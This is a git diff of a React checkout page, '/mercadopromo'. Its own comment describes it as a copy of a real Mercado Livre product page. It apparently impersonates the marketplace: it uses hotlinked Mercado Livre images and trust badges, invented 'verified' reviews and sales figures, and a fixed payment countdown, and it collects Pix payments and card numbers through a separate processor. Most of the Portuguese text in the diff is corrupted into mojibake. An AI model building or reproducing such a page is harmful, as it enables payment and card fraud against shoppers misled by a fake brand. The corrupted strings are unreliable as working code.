@@ -30,45 +30,62 @@ import { fbqTrack } from "@/lib/pixel";
 import { createHypercashTransaction } from "@/lib/hypercash.functions";
 import mlLogo from "@/assets/mercadopromo/ml-logo.png";
 import pixLogo from "@/assets/mercadopromo/pix-logo.png";
+import payAmex from "@/assets/mercadopromo/pay-amex.png";
+import payElo from "@/assets/mercadopromo/pay-elo.png";
+import payVisa from "@/assets/mercadopromo/pay-visa.png";
+import payMastercard from "@/assets/mercadopromo/pay-mastercard.png";
+import payPix from "@/assets/mercadopromo/pay-pix.png";
+import jacketMarromVideo from "@/assets/mercadopromo/jaqueta-marrom-video.mp4";
+import boots1 from "@/assets/mercadopromo/boots-1.png";
+import boots2 from "@/assets/mercadopromo/boots-2.png";
+import boots3 from "@/assets/mercadopromo/boots-3.png";
+import pants1 from "@/assets/mercadopromo/pants-1.png";
+import pants2 from "@/assets/mercadopromo/pants-2.png";
+import pants3 from "@/assets/mercadopromo/pants-3.png";
 import review1 from "@/assets/mercadopromo/review-1.jpg";
 import review2 from "@/assets/mercadopromo/review-2.jpg";
 import review3 from "@/assets/mercadopromo/review-3.jpg";
 
 // -----------------------------------------------------------------------------
-// /mercadopromo — página standalone estilo Mercado Livre (produto único).
+// /mercadopromo â€” pÃ¡gina standalone estilo Mercado Livre (produto Ãºnico).
 // Template baseado em modamolecapromos.lovable.app + PDP real do ML.
-// Não usa StoreLayout da Paze pra ficar 100% isolado. Pixel continua ativo
+// NÃ£o usa StoreLayout da Paze pra ficar 100% isolado. Pixel continua ativo
 // pelo __root.tsx global.
 // -----------------------------------------------------------------------------
 
 const PRODUCT = {
-  title: "Jaqueta Feminina Courino Slim Casaco Frio Zíper Motoqueiro",
+  title: "Jaqueta Feminina Courino Slim Casaco Frio ZÃ­per Motoqueiro",
   brand: "SKATHI",
   seller: "Skhati Wear",
   sold: "+800 vendidos",
   rating: 5.0,
   reviewsCount: 9,
-  price: 20479, // centavos
+  price: 7990, // centavos
   compareAt: null as number | null,
-  installments: { count: 6, valueCents: 3413 },
-  categoryTrail: ["Calçados, Roupas e Bolsas", "Agasalhos", "Casacos e Jaquetas"],
+  installments: { count: 6, valueCents: 1332 },
+  categoryTrail: ["CalÃ§ados, Roupas e Bolsas", "Agasalhos", "Casacos e Jaquetas"],
+};
+
+type GalleryMedia = {
+  src: string;
+  kind: "image" | "video";
 };
 
 const COLORS: {
   key: string;
   label: string;
   thumb: string;
-  gallery: string[];
+  gallery: GalleryMedia[];
 }[] = [
   {
     key: "marrom",
     label: "Marrom",
     thumb: "https://http2.mlstatic.com/D_NQ_NP_2X_810204-MLB110339498152_052026-F.webp",
     gallery: [
-      "https://http2.mlstatic.com/D_NQ_NP_2X_810204-MLB110339498152_052026-F.webp",
-      "https://http2.mlstatic.com/D_NQ_NP_2X_662783-MLB111271156807_052026-F.webp",
-      "https://http2.mlstatic.com/D_NQ_NP_2X_683019-MLB111271096821_052026-F.webp",
-      "https://http2.mlstatic.com/D_NQ_NP_2X_811888-MLB111272942717_052026-F.webp",
+      { src: "https://http2.mlstatic.com/D_NQ_NP_2X_810204-MLB110339498152_052026-F.webp", kind: "image" },
+      { src: "https://http2.mlstatic.com/D_NQ_NP_2X_662783-MLB111271156807_052026-F.webp", kind: "image" },
+      { src: "https://http2.mlstatic.com/D_NQ_NP_2X_683019-MLB111271096821_052026-F.webp", kind: "image" },
+      { src: jacketMarromVideo, kind: "video" },
     ],
   },
   {
@@ -76,9 +93,9 @@ const COLORS: {
     label: "Branco",
     thumb: "https://http2.mlstatic.com/D_NQ_NP_2X_866958-MLB111273807557_052026-F.webp",
     gallery: [
-      "https://http2.mlstatic.com/D_NQ_NP_2X_866958-MLB111273807557_052026-F.webp",
-      "https://http2.mlstatic.com/D_NQ_NP_2X_698571-MLB111273241677_052026-F.webp",
-      "https://http2.mlstatic.com/D_NQ_NP_2X_789158-MLB111273927385_052026-F.webp",
+      { src: "https://http2.mlstatic.com/D_NQ_NP_2X_866958-MLB111273807557_052026-F.webp", kind: "image" },
+      { src: "https://http2.mlstatic.com/D_NQ_NP_2X_698571-MLB111273241677_052026-F.webp", kind: "image" },
+      { src: "https://http2.mlstatic.com/D_NQ_NP_2X_789158-MLB111273927385_052026-F.webp", kind: "image" },
     ],
   },
   {
@@ -86,9 +103,9 @@ const COLORS: {
     label: "Preto",
     thumb: "https://http2.mlstatic.com/D_NQ_NP_2X_958620-MLB110339498344_052026-F.webp",
     gallery: [
-      "https://http2.mlstatic.com/D_NQ_NP_2X_958620-MLB110339498344_052026-F.webp",
-      "https://http2.mlstatic.com/D_NQ_NP_2X_695488-MLB111273241551_052026-F.webp",
-      "https://http2.mlstatic.com/D_NQ_NP_2X_992725-MLB110339498342_052026-F.webp",
+      { src: "https://http2.mlstatic.com/D_NQ_NP_2X_958620-MLB110339498344_052026-F.webp", kind: "image" },
+      { src: "https://http2.mlstatic.com/D_NQ_NP_2X_695488-MLB111273241551_052026-F.webp", kind: "image" },
+      { src: "https://http2.mlstatic.com/D_NQ_NP_2X_992725-MLB110339498342_052026-F.webp", kind: "image" },
     ],
   },
 ];
@@ -107,24 +124,24 @@ const PAYMENT_METHODS = {
   credit: [
     {
       name: "American Express",
-      src: "https://http2.mlstatic.com/storage/logos-api-admin/b2c93a40-f3be-11eb-9984-b7076edb0bb7-m.svg",
+      src: payAmex,
     },
     {
       name: "Elo",
-      src: "https://http2.mlstatic.com/storage/logos-api-admin/bb7c7bb0-adec-11f0-92e6-59fb0bcb38c2-m.svg",
+      src: payElo,
     },
     {
       name: "Visa",
-      src: "https://http2.mlstatic.com/storage/logos-api-admin/a5f047d0-9be0-11ec-aad4-c3381f368aaf-m.svg",
+      src: payVisa,
     },
     {
       name: "Mastercard",
-      src: "https://http2.mlstatic.com/storage/logos-api-admin/9cf818e0-723a-11f0-a459-cf21d0937aeb-m.svg",
+      src: payMastercard,
     },
   ],
   pix: {
     name: "Pix",
-    src: "https://http2.mlstatic.com/storage/logos-api-admin/f99fcca0-f3bd-11eb-9984-b7076edb0bb7-m.svg",
+    src: payPix,
   },
 };
 
@@ -136,53 +153,52 @@ const SELLER = {
 
 const RELATED = [
   {
-    img: "https://http2.mlstatic.com/D_NQ_NP_2X_970240-MLA112330527416_062026-O.webp",
-    title: "Jaqueta Feminina Ecológica Courino Fake Impermeável Off-White",
-    priceCents: 7485,
-    installments: "3x R$ 24,95 sem juros",
+    img: boots1,
+    gallery: [boots1, boots2, boots3],
+    title: "Montaria Feminina Cano Longo Coturno Cadarço Atrás",
+    description:
+      "Bota montaria de cano longo com acabamento liso, fechamento por cadarço atrás e sola firme para uso diário. Visual elegante para compor looks urbanos e de inverno.",
+    priceCents: 4990,
+    installments: "até 6x sem juros",
     freeShip: true,
   },
   {
-    img: "https://http2.mlstatic.com/D_NQ_NP_2X_913340-MLA112678655910_062026-O.webp",
-    title: "Jaqueta Feminina Slim Couro Pu Detalhes Dourado Facinelli",
-    priceCents: 23673,
-    compareCents: 25690,
-    installments: "ou R$ 249,19 em 6x R$ 41,53 sem juros",
-    freeShip: true,
-    discount: "7% OFF no Pix",
-  },
-  {
-    img: "https://http2.mlstatic.com/D_NQ_NP_2X_740782-MLA113206222295_062026-O.webp",
-    title: "Jaqueta Feminina Couro Pixie Slim Casaco Blusa Impermeável",
-    priceCents: 20499,
-    installments: "6x R$ 34,16 sem juros",
+    img: pants1,
+    gallery: [pants1, pants2, pants3],
+    title: "Calça Hiperlipo Modeladora Chapa Barriga Suplex e Poliam Leg",
+    description:
+      "Calça modeladora com cintura alta, tecido encorpado e elasticidade confortável, pensada para valorizar a silhueta com firmeza e conforto no uso diário.",
+    priceCents: 5990,
+    installments: "até 6x sem juros",
     freeShip: true,
   },
 ];
+
+type RelatedProduct = (typeof RELATED)[number];
 
 const REVIEWS = [
   {
     name: "juliana.m",
     verified: true,
     rating: 5,
-    text: "Chegou super rápido, o couro sintético é firme e o caimento slim ficou perfeito. Comprei M e serviu certinho.",
-    when: "há 1 mês",
+    text: "Chegou super rÃ¡pido, o couro sintÃ©tico Ã© firme e o caimento slim ficou perfeito. Comprei M e serviu certinho.",
+    when: "hÃ¡ 1 mÃªs",
     photo: review1,
   },
   {
     name: "carol.s",
     verified: true,
     rating: 5,
-    text: "Linda! Igual à foto, cor marrom-escuro exatamente como aparece. Quente sem ser pesada.",
-    when: "há 2 meses",
+    text: "Linda! Igual Ã  foto, cor marrom-escuro exatamente como aparece. Quente sem ser pesada.",
+    when: "hÃ¡ 2 meses",
     photo: review2,
   },
   {
     name: "priscila.f",
     verified: true,
     rating: 5,
-    text: "Recomendo demais. Zíper de qualidade, costura reforçada. Já é a segunda que compro.",
-    when: "há 2 meses",
+    text: "Recomendo demais. ZÃ­per de qualidade, costura reforÃ§ada. JÃ¡ Ã© a segunda que compro.",
+    when: "hÃ¡ 2 meses",
     photo: review3,
   },
 ];
@@ -256,12 +272,12 @@ export const Route = createFileRoute("/mercadopromo")({
       {
         name: "description",
         content:
-          "Jaqueta feminina slim em courino com zíper estilo motoqueiro. Frete grátis, 6x sem juros e devolução grátis em até 30 dias.",
+          "Jaqueta feminina slim em courino com zÃ­per estilo motoqueiro. Frete grÃ¡tis, 6x sem juros e devoluÃ§Ã£o grÃ¡tis em atÃ© 30 dias.",
       },
       { property: "og:title", content: PRODUCT.title },
       {
         property: "og:description",
-        content: "Frete grátis e 6x sem juros no Mercado Livre.",
+        content: "Frete grÃ¡tis e 6x sem juros no Mercado Livre.",
       },
       { property: "og:image", content: COLORS[0].gallery[0] },
     ],
@@ -275,7 +291,7 @@ function MercadoPromoPage() {
     () => COLORS.find((c) => c.key === colorKey) ?? COLORS[0],
     [colorKey],
   );
-  const [activeImg, setActiveImg] = useState(color.gallery[0]);
+  const [activeImg, setActiveImg] = useState(color.gallery[0].src);
   const [size, setSize] = useState<string | null>(null);
   const [qty, setQty] = useState(1);
   const [sizeGuideOpen, setSizeGuideOpen] = useState(false);
@@ -284,7 +300,7 @@ function MercadoPromoPage() {
   const priceSplit = formatBRLSplit(PRODUCT.price);
 
   useEffect(() => {
-    setActiveImg(color.gallery[0]);
+    setActiveImg(color.gallery[0].src);
   }, [color]);
 
   useEffect(() => {
@@ -356,7 +372,7 @@ function MercadoPromoPage() {
       <div className="mx-auto hidden max-w-[1200px] px-4 py-3 text-[13px] md:block">
         <div className="flex flex-wrap items-center gap-x-2 gap-y-1">
           <a href="#" className="text-[#3483fa] hover:underline">
-            Voltar à lista
+            Voltar Ã  lista
           </a>
           <span className="text-[#999]">|</span>
           {PRODUCT.categoryTrail.map((c, i) => (
@@ -386,25 +402,40 @@ function MercadoPromoPage() {
           {/* Gallery */}
           <div className="flex gap-3">
             <div className="hidden w-14 flex-col gap-2 lg:flex">
-              {color.gallery.map((src) => (
+              {color.gallery.map((media) => (
                 <button
-                  key={src}
-                  onMouseEnter={() => setActiveImg(src)}
-                  onClick={() => setActiveImg(src)}
+                  key={media.src}
+                  onMouseEnter={() => setActiveImg(media.src)}
+                  onClick={() => setActiveImg(media.src)}
                   className={`aspect-square overflow-hidden rounded border bg-white ${
-                    activeImg === src ? "border-[#3483fa]" : "border-[#e0e0e0]"
+                    activeImg === media.src ? "border-[#3483fa]" : "border-[#e0e0e0]"
                   }`}
                 >
-                  <img src={src} alt="" className="h-full w-full object-cover" loading="lazy" />
+                  {media.kind === "video" ? (
+                    <video src={media.src} muted playsInline className="h-full w-full object-cover" />
+                  ) : (
+                    <img src={media.src} alt="" className="h-full w-full object-cover" loading="lazy" />
+                  )}
                 </button>
               ))}
             </div>
             <div className="relative flex-1 overflow-hidden rounded bg-white">
-              <img
-                src={activeImg}
-                alt={PRODUCT.title}
-                className="mx-auto aspect-[3/4] w-full max-w-[520px] object-cover"
-              />
+              {activeImg === jacketMarromVideo ? (
+                <video
+                  src={activeImg}
+                  className="mx-auto aspect-[3/4] w-full max-w-[520px] object-cover"
+                  autoPlay
+                  loop
+                  muted
+                  playsInline
+                />
+              ) : (
+                <img
+                  src={activeImg}
+                  alt={PRODUCT.title}
+                  className="mx-auto aspect-[3/4] w-full max-w-[520px] object-cover"
+                />
+              )}
               <button className="absolute right-3 top-3 rounded-full bg-white/90 p-2 shadow hover:bg-white">
                 <Heart className="h-5 w-5 text-[#3483fa]" />
               </button>
@@ -414,15 +445,19 @@ function MercadoPromoPage() {
           </div>
           {/* Mobile thumbnails row */}
           <div className="-mt-2 flex gap-2 overflow-x-auto lg:hidden">
-            {color.gallery.map((src) => (
+            {color.gallery.map((media) => (
               <button
-                key={src}
-                onClick={() => setActiveImg(src)}
+                key={media.src}
+                onClick={() => setActiveImg(media.src)}
                 className={`h-14 w-14 flex-shrink-0 overflow-hidden rounded border ${
-                  activeImg === src ? "border-[#3483fa]" : "border-[#e0e0e0]"
+                  activeImg === media.src ? "border-[#3483fa]" : "border-[#e0e0e0]"
                 }`}
               >
-                <img src={src} alt="" className="h-full w-full object-cover" loading="lazy" />
+                {media.kind === "video" ? (
+                  <video src={media.src} muted playsInline className="h-full w-full object-cover" />
+                ) : (
+                  <img src={media.src} alt="" className="h-full w-full object-cover" loading="lazy" />
+                )}
               </button>
             ))}
           </div>
@@ -438,7 +473,7 @@ function MercadoPromoPage() {
               MAIS VENDIDO
             </div>
             <div className="mb-1 text-[13px] text-[#666]">
-              1º em <a href="#" className="text-[#3483fa] hover:underline">Casacos e Jaquetas {PRODUCT.brand}</a>
+              1Âº em <a href="#" className="text-[#3483fa] hover:underline">Casacos e Jaquetas {PRODUCT.brand}</a>
             </div>
             <h1 className="mb-2 text-[22px] font-semibold leading-tight text-[#333] md:text-[24px]">
               {PRODUCT.title}
@@ -526,10 +561,10 @@ function MercadoPromoPage() {
           <div className="rounded-md border border-[#e6e6e6] p-4">
             <div className="mb-3 inline-flex items-center gap-1 rounded bg-[#00a650] px-2 py-1 text-[12px] font-semibold text-white">
               <Zap className="h-3 w-3 fill-white" strokeWidth={0} />
-              FRETE GRÁTIS ACIMA DE R$ 19
+              FRETE GRÃTIS ACIMA DE R$ 19
             </div>
             <p className="text-[14px]">
-              <span className="text-[#00a650]">Chegará grátis</span> entre{" "}
+              <span className="text-[#00a650]">ChegarÃ¡ grÃ¡tis</span> entre{" "}
               <span className="text-[#00a650]">quinta-feira e sexta-feira</span> por ser sua primeira compra
             </p>
             <a href="#" className="mt-1 inline-block text-[13px] text-[#3483fa] hover:underline">
@@ -537,17 +572,17 @@ function MercadoPromoPage() {
             </a>
 
             <p className="mt-4 text-[14px]">
-              <span className="text-[#00a650]">Retire grátis</span> a partir de segunda-feira em uma agência Mercado Livre
+              <span className="text-[#00a650]">Retire grÃ¡tis</span> a partir de segunda-feira em uma agÃªncia Mercado Livre
             </p>
             <a href="#" className="text-[13px] text-[#3483fa] hover:underline">
               Ver no mapa
             </a>
 
             <p className="mt-4 text-[14px]">
-              <span className="text-[#00a650]">Devolução grátis.</span> Você tem 30 dias a partir da data de recebimento.
+              <span className="text-[#00a650]">DevoluÃ§Ã£o grÃ¡tis.</span> VocÃª tem 30 dias a partir da data de recebimento.
             </p>
 
-            <div className="mt-5 text-[14px] text-[#333]">Estoque disponível</div>
+            <div className="mt-5 text-[14px] text-[#333]">Estoque disponÃ­vel</div>
             <div className="mt-1 flex items-center gap-2 text-[14px]">
               <span>Quantidade:</span>
               <button
@@ -573,7 +608,7 @@ function MercadoPromoPage() {
                 </select>
                 <ChevronDown className="pointer-events-none absolute right-2 top-1/2 h-4 w-4 -translate-y-1/2 text-[#666]" />
               </div>
-              <span className="text-[#666]">(2 disponíveis)</span>
+              <span className="text-[#666]">(2 disponÃ­veis)</span>
             </div>
 
             <button
@@ -598,20 +633,20 @@ function MercadoPromoPage() {
                   {PRODUCT.seller}
                 </a>
               </div>
-              <div className="text-[13px] text-[#666]">MercadoLíder | +10 mil vendas</div>
+              <div className="text-[13px] text-[#666]">MercadoLÃ­der | +10 mil vendas</div>
             </div>
 
             <ul className="mt-4 space-y-3 text-[13px]">
               <li className="flex gap-2">
                 <ShieldCheck className="mt-0.5 h-4 w-4 flex-shrink-0 text-[#3483fa]" />
                 <span>
-                  <a href="#" className="text-[#3483fa] hover:underline">Compra Garantida</a>. Receba o produto que está esperando ou devolvemos o dinheiro.
+                  <a href="#" className="text-[#3483fa] hover:underline">Compra Garantida</a>. Receba o produto que estÃ¡ esperando ou devolvemos o dinheiro.
                 </span>
               </li>
               <li className="flex gap-2">
                 <Gift className="mt-0.5 h-4 w-4 flex-shrink-0 text-[#3483fa]" />
                 <span>
-                  <a href="#" className="text-[#3483fa] hover:underline">Vale-troca para presente</a>. A pessoa que o receber poderá trocá-lo.
+                  <a href="#" className="text-[#3483fa] hover:underline">Vale-troca para presente</a>. A pessoa que o receber poderÃ¡ trocÃ¡-lo.
                 </span>
               </li>
             </ul>
@@ -637,9 +672,9 @@ function MercadoPromoPage() {
           </div>
         </div>
 
-        {/* Opiniões */}
+        {/* OpiniÃµes */}
         <div className="border-t border-[#eee] p-4 md:p-6">
-          <h2 className="mb-4 text-[22px] font-semibold">Opiniões do produto</h2>
+          <h2 className="mb-4 text-[22px] font-semibold">OpiniÃµes do produto</h2>
           <div className="grid gap-6 md:grid-cols-[260px_minmax(0,1fr)]">
             <div>
               <div className="text-[48px] font-light leading-none">{PRODUCT.rating.toFixed(1)}</div>
@@ -648,7 +683,7 @@ function MercadoPromoPage() {
                   <Star key={i} className="h-4 w-4 fill-[#3483fa] text-[#3483fa]" strokeWidth={0} />
                 ))}
               </div>
-              <div className="mt-1 text-[13px] text-[#666]">{PRODUCT.reviewsCount} avaliações</div>
+              <div className="mt-1 text-[13px] text-[#666]">{PRODUCT.reviewsCount} avaliaÃ§Ãµes</div>
               <div className="mt-4 space-y-1">
                 {[
                   [5, 8],
@@ -679,7 +714,7 @@ function MercadoPromoPage() {
                   <div className="mb-1 flex items-center gap-1 text-[14px]">
                     <span className="text-[#333]">{r.name}</span>
                     {r.verified && (
-                      <span className="text-[12px] text-[#00a650]">✓ Verificado</span>
+                      <span className="text-[12px] text-[#00a650]">âœ“ Verificado</span>
                     )}
                   </div>
                   <div className="mb-2 flex">
@@ -741,7 +776,6 @@ function MercadoCheckout({
   const [step, setStep] = useState<1 | 2 | 3>(1);
   const [summaryOpen, setSummaryOpen] = useState(false);
   const [loading, setLoading] = useState(false);
-  const [pixCelebration, setPixCelebration] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [copied, setCopied] = useState(false);
   const [paymentMethod, setPaymentMethod] = useState<"PIX" | "CREDIT_CARD">("PIX");
@@ -867,7 +901,6 @@ function MercadoCheckout({
   async function finishPixPurchase() {
     if (!identityComplete || !addressComplete || loading) return;
     setLoading(true);
-    setPixCelebration(true);
     setError(null);
     fbqTrack("AddPaymentInfo", {
       content_ids: ["mercadopromo-jaqueta-courino"],
@@ -883,7 +916,6 @@ function MercadoCheckout({
           externalRef: `mercadopromo-${Date.now()}`,
         },
       });
-      await new Promise((resolve) => setTimeout(resolve, 1400));
       setTx({
         id: result.id,
         status: result.status,
@@ -893,7 +925,6 @@ function MercadoCheckout({
     } catch (err) {
       setError(err instanceof Error ? err.message : "Falha ao gerar o Pix. Tente novamente.");
     } finally {
-      setPixCelebration(false);
       setLoading(false);
     }
   }
@@ -937,7 +968,7 @@ function MercadoCheckout({
         currency: "BRL",
       });
     } catch (err) {
-      setError(err instanceof Error ? err.message : "Falha ao processar o cartão. Confira os dados e tente novamente.");
+      setError(err instanceof Error ? err.message : "Falha ao processar o cartÃ£o. Confira os dados e tente novamente.");
     } finally {
       setLoading(false);
     }
@@ -962,16 +993,9 @@ function MercadoCheckout({
       setCopied(true);
       setTimeout(() => setCopied(false), 1800);
     } catch {
-      setError("Não foi possível copiar automaticamente. Selecione o código Pix na tela.");
+      setError("NÃ£o foi possÃ­vel copiar automaticamente. Selecione o cÃ³digo Pix na tela.");
     }
   }
-
-  if (pixCelebration) {
-    return (
-      <PixCelebrationScreen />
-    );
-  }
-
   return (
     <div className="mercado-promo-page min-h-screen bg-white text-[#001133]">
       <style>{`
@@ -1016,7 +1040,7 @@ function MercadoCheckout({
 
         <section className="space-y-4 lg:col-start-1">
           {step > 1 && (
-            <CompletedCard title="Identificação" onEdit={() => setStep(1)}>
+            <CompletedCard title="IdentificaÃ§Ã£o" onEdit={() => setStep(1)}>
               <strong>{form.name}</strong>
               <span>{form.email}</span>
               <span>{form.phone}</span>
@@ -1032,7 +1056,7 @@ function MercadoCheckout({
                 {form.neighborhood}, {form.city}/{form.state.toUpperCase()} {form.zipCode}
               </span>
               <span className="mt-3 font-semibold">Frete selecionado</span>
-              <span>Envio - Grátis</span>
+              <span>Envio - GrÃ¡tis</span>
             </CompletedCard>
           )}
         </section>
@@ -1040,7 +1064,7 @@ function MercadoCheckout({
         <section className="md:col-start-1 lg:col-start-2">
           {step === 1 && (
             <form onSubmit={goToDelivery} className="rounded-md border border-[#d9e0ea] bg-white p-6 shadow-sm">
-              <StepTitle title="Identificação" step="1 de 3" subtitle="Preencha seus dados para envio do pedido." />
+              <StepTitle title="IdentificaÃ§Ã£o" step="1 de 3" subtitle="Preencha seus dados para envio do pedido." />
               <div className="mt-8 space-y-5">
                 <CheckoutField label="Nome completo">
                   <input
@@ -1094,7 +1118,7 @@ function MercadoCheckout({
 
           {step === 2 && (
             <form onSubmit={goToPayment} className="rounded-md border border-[#d9e0ea] bg-white p-6 shadow-sm">
-              <StepTitle title="Entrega" step="2 de 3" subtitle="Informe o endereço de entrega" />
+              <StepTitle title="Entrega" step="2 de 3" subtitle="Informe o endereÃ§o de entrega" />
               <div className="mt-6 space-y-5">
                 <CheckoutField label="CEP">
                   <div className="flex flex-wrap items-center gap-3">
@@ -1113,7 +1137,7 @@ function MercadoCheckout({
                   </div>
                 </CheckoutField>
 
-                <CheckoutField label="Endereço">
+                <CheckoutField label="EndereÃ§o">
                   <div className="relative">
                     <input
                       value={form.street}
@@ -1126,14 +1150,14 @@ function MercadoCheckout({
                 </CheckoutField>
 
                 <div className="grid grid-cols-[68px_minmax(0,1fr)] gap-3">
-                  <CheckoutField label="N°">
+                  <CheckoutField label="NÂ°">
                     <input
                       value={form.streetNumber}
                       onChange={(event) => setForm({ ...form, streetNumber: event.target.value })}
-                      placeholder="Número"
+                      placeholder="NÃºmero"
                       className={`${checkoutInputClass} ${form.streetNumber ? "bg-[#eef4ff]" : "border-[#ff8ba1] bg-[#ffe9ee] text-[#d62850]"}`}
                     />
-                    {!form.streetNumber && <div className="mt-1 text-[11px] text-[#d62850]">Número é obrigatório</div>}
+                    {!form.streetNumber && <div className="mt-1 text-[11px] text-[#d62850]">NÃºmero Ã© obrigatÃ³rio</div>}
                   </CheckoutField>
                   <CheckoutField label="Bairro">
                     <div className="relative">
@@ -1171,7 +1195,7 @@ function MercadoCheckout({
                         <span className="text-[11px] text-[#667085]">2 a 5 dias <b className="text-[#00a650]">FULL</b></span>
                       </span>
                     </span>
-                    <span className="text-[13px] font-semibold">Grátis</span>
+                    <span className="text-[13px] font-semibold">GrÃ¡tis</span>
                   </button>
                 </div>
 
@@ -1188,7 +1212,7 @@ function MercadoCheckout({
 
           {step === 3 && (
             <div className="rounded-md border border-[#d9e0ea] bg-white p-6 shadow-sm">
-              <StepTitle title="Pagamento" step="3 de 3" subtitle="Todas as transações são seguras e criptografadas." />
+              <StepTitle title="Pagamento" step="3 de 3" subtitle="Todas as transaÃ§Ãµes sÃ£o seguras e criptografadas." />
               {tx?.method === "PIX" ? (
                 <PixPaymentPanel
                   pixCode={pixCode}
@@ -1209,7 +1233,7 @@ function MercadoCheckout({
                   {paymentMethod === "PIX" && (
                     <div className="rounded-md border border-[#1675f8] p-4">
                       <div className="text-[14px] leading-relaxed text-[#667085]">
-                        <p>O código Pix expira em 30 minutos após finalizar a compra.</p>
+                        <p>O cÃ³digo Pix expira em 30 minutos apÃ³s finalizar a compra.</p>
                         <p className="mt-4">Valor no Pix: <b>{formatBRL(totalCents)}</b></p>
                       </div>
                       <button
@@ -1228,12 +1252,12 @@ function MercadoCheckout({
                     selected={paymentMethod === "CREDIT_CARD"}
                     onClick={() => setPaymentMethod("CREDIT_CARD")}
                     icon={<CreditCard className="h-4 w-4 text-[#667085]" />}
-                    title="Cartão de crédito"
+                    title="CartÃ£o de crÃ©dito"
                   />
                   {paymentMethod === "CREDIT_CARD" && (
                     <div className="rounded-md border border-[#1675f8] p-4">
                       <div className="grid gap-4">
-                        <CheckoutField label="Nome impresso no cartão">
+                        <CheckoutField label="Nome impresso no cartÃ£o">
                           <input
                             value={card.holderName}
                             onChange={(event) => setCard({ ...card, holderName: event.target.value.toUpperCase() })}
@@ -1241,7 +1265,7 @@ function MercadoCheckout({
                             className={checkoutInputClass}
                           />
                         </CheckoutField>
-                        <CheckoutField label="Número do cartão">
+                        <CheckoutField label="NÃºmero do cartÃ£o">
                           <input
                             inputMode="numeric"
                             value={card.number}
@@ -1295,7 +1319,7 @@ function MercadoCheckout({
                         className="mt-5 flex w-full items-center justify-center gap-2 rounded-md bg-[#1675f8] py-3.5 text-[16px] font-semibold text-white transition hover:bg-[#0b63d8] disabled:cursor-not-allowed disabled:opacity-60"
                       >
                         {loading && <Loader2 className="h-4 w-4 animate-spin" />}
-                        Pagar com cartão
+                        Pagar com cartÃ£o
                       </button>
                     </div>
                   )}
@@ -1356,37 +1380,7 @@ function PaymentChoice({
   );
 }
 
-function PixCelebrationScreen() {
-  return (
-    <div className="mercado-promo-page relative flex min-h-screen flex-col overflow-hidden bg-[#00a650] text-white">
-      <style>{`
-        @keyframes pixWash {
-          0% { transform: scale(0.9); opacity: 0; filter: blur(16px); }
-          45% { opacity: 0.95; }
-          100% { transform: scale(1.15); opacity: 1; filter: blur(0); }
-        }
-        @keyframes pixTextIn {
-          from { opacity: 0; transform: translateY(18px); }
-          to { opacity: 1; transform: translateY(0); }
-        }
-      `}</style>
-      <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_20%,#55d98b_0%,#18b86b_36%,#079b55_68%,#007b43_100%)]" />
-      <div className="absolute -left-20 top-20 h-72 w-72 rounded-full bg-white/10 blur-3xl" style={{ animation: "pixWash 1.4s ease forwards" }} />
-      <div className="absolute -right-16 bottom-16 h-80 w-80 rounded-full bg-white/10 blur-3xl" style={{ animation: "pixWash 1.7s ease forwards" }} />
-      <div className="relative z-10 flex flex-1 flex-col items-center justify-center px-6 text-center" style={{ animation: "pixTextIn 0.8s ease 0.2s both" }}>
-        <img src={pixLogo} alt="Pix" className="mb-8 h-20 w-20 drop-shadow-lg" />
-        <h1 className="text-[30px] font-semibold leading-tight md:text-[42px]">
-          Tudo certo com a sua compra,
-          <br />
-          agora é só pagar!
-        </h1>
-      </div>
-      <div className="relative z-10 px-4 pb-8">
-        <PaymentFooter light />
-      </div>
-    </div>
-  );
-}
+
 
 function PixPaymentPanel({
   pixCode,
@@ -1401,9 +1395,9 @@ function PixPaymentPanel({
 }) {
   return (
     <div className="mt-6 text-center">
-      <h2 className="text-[28px] font-semibold text-[#333]">Quase lá...</h2>
+      <h2 className="text-[28px] font-semibold text-[#333]">Quase lÃ¡...</h2>
       <p className="mt-3 text-[14px] text-[#526173]">
-        Pague via pix em até <b>05:52</b> para confirmar seu pedido.
+        Pague via pix em atÃ© <b>05:52</b> para confirmar seu pedido.
       </p>
       <div className="mx-auto mt-4 inline-flex rounded-full bg-[#fff3cd] px-6 py-2 text-[13px] font-semibold text-[#a36b00]">
         Aguardando pagamento
@@ -1415,7 +1409,7 @@ function PixPaymentPanel({
           <span className="absolute -right-7 top-10 h-5 w-8 rounded-full bg-[#ff977d]" />
         </div>
       </div>
-      <p className="mt-7 text-[14px] text-[#526173]">Aponte a câmera do seu celular</p>
+      <p className="mt-7 text-[14px] text-[#526173]">Aponte a cÃ¢mera do seu celular</p>
       {pixImage && (
         <img src={pixImage} alt="QR Code Pix" className="mx-auto mt-3 h-56 w-56 bg-white object-contain md:h-64 md:w-64" />
       )}
@@ -1430,18 +1424,18 @@ function PixPaymentPanel({
             className="mx-auto mt-3 flex w-full max-w-[356px] items-center justify-center gap-2 rounded-md border border-[#d9e0ea] bg-white py-3 text-[14px] font-semibold text-[#111] shadow-sm"
           >
             <Copy className="h-4 w-4" />
-            {copied ? "Código copiado" : "Copiar código"}
+            {copied ? "CÃ³digo copiado" : "Copiar cÃ³digo"}
           </button>
         </>
       )}
       <div className="mx-auto mt-8 max-w-[356px] text-left">
         <h3 className="text-[18px] font-semibold text-[#1d2733]">Como pagar o pix</h3>
         {[
-          "Clique em copiar o código, logo acima",
+          "Clique em copiar o cÃ³digo, logo acima",
           "Abra o aplicativo do seu banco",
-          "Selecione a opção PIX",
+          "Selecione a opÃ§Ã£o PIX",
           'Toque em "Pix Copia e Cola"',
-          "Insira o código copiado e finalize seu pagamento",
+          "Insira o cÃ³digo copiado e finalize seu pagamento",
         ].map((step, index) => (
           <div key={step} className="mt-4 flex items-start gap-3 text-[13px] text-[#526173]">
             <span className="grid h-5 w-5 flex-shrink-0 place-items-center rounded-full bg-[#16bf8f] text-[12px] font-semibold text-white">{index + 1}</span>
@@ -1470,9 +1464,9 @@ function CardApprovedPanel({
       <Check className="mx-auto h-12 w-12 rounded-full bg-[#00a650] p-2 text-white" />
       <h2 className="mt-4 text-[22px] font-semibold text-[#001133]">Pagamento enviado!</h2>
       <p className="mt-2 text-[14px] text-[#526173]">
-        Recebemos sua solicitação no cartão em {installments}x de {formatBRL(Math.ceil(totalCents / installments))}.
+        Recebemos sua solicitaÃ§Ã£o no cartÃ£o em {installments}x de {formatBRL(Math.ceil(totalCents / installments))}.
       </p>
-      <p className="mt-1 text-[12px] text-[#667085]">Status da transação: {status}</p>
